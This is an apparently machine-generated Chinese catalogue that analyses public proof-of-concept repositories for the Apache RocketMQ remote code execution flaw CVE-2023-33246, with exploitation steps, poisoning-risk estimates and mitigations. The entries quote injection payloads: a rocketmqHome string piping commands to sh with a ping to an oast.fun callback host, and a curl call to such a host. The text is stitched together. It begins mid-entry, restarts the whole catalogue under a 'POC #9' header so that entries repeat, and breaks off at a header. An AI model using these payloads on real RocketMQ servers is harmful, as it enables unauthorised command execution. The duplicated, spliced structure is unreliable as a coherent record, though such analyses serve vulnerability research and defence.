**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

